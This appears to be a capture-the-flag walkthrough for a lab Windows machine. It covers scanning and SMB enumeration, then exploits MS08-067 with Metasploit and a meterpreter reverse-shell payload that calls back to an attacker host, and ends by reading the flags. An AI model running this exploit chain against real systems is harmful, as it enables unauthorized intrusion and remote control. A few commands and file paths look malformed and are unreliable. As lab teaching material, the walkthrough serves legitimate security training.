# Windows Legacy Exploitation Walkthrough

## Overview
This guide details the steps for identifying and exploiting a vulnerable **Windows Legacy** machine, using enumeration, SMB vulnerability scanning, and exploitation with Metasploit.

---

## 1. Identifying the Target OS
Run the following **ping** command to determine the OS based on TTL values:

```bash
sudo ping -c 1 10.10.10.4
```

- **TTL < 65** → Linux
- **TTL 65-128** → Windows
- **TTL > 128** → Network appliance

Since the TTL is **127**, the target is a **Windows** machine.

---

## 2. Running an Nmap Scan
Perform an **aggressive full-port scan** with service detection:

```bash
sudo nmap -vvv -Pn -sCV --reason -T4 -p 0-65535 -oN legacy.nmap 10.10.10.4
```

- **`-sCV`** → Runs default scripts and version detection
- **`-Pn`** → Treats the host as online
- **`-T4`** → Aggressive timing
- **`-oN legacy.nmap`** → Saves output to a file

---

## 3. Enumerating SMB (Server Message Block)

### **Using enum4linux**
```bash
sudo enum4linux -a 10.10.10.4
```

### **Checking SMB Shares**
```bash
sudo smbmap -H 10.10.10.4
```
```bash
sudo smbclient --no-pass --list=\\10.10.10.4\
```
```bash
sudo smbclient -N -L =\\10.10.10.4\
```

---

## 4. Scanning for SMB Vulnerabilities

Find relevant **SMB vulnerability scripts**:
```bash
ls /usr/share/nmap/scripts | grep smb | grep vuln
```

Run **Nmap SMB Vulnerability Scan**:
```bash
sudo nmap -vvv -Pn -sCV -T4 -p 139,445 --script smb-vuln* -oN legacy_smb.nmap 10.10.10.4
```

---

## 5. Exploiting MS08-067 (SMB Vulnerability)

Start **Metasploit** and run the exploit:
```bash
msfconsole
```
```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Your_IP>
set RPORT 445
exploit
```

---

## 6. Post-Exploitation

### **Meterpreter Commands**
```bash
sysinfo   # Get system information
shell     # Get interactive command shell
whoami    # Check current user
```

### **Get User Flag**
Navigate to `C:\Users\Public\Desktop` and retrieve the flag:
```bash
cd C:\Users\Public\Desktop
type user.txt
```

### **Get Admin Flag**
Navigate to `C:\Users\Administrator\Desktop` and retrieve the flag:
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## Summary
✅ **Ping TTL** confirms Windows
✅ **Nmap** finds open ports (likely SMB 445)
✅ **Enum4linux** and **smbmap** list SMB shares
✅ **Nmap SMB Vuln Scan** confirms **MS08-067**
✅ **Metasploit** exploits MS08-067 for **meterpreter shell**
✅ **User & Admin flags retrieved**

### 🚀 Exploitation complete!
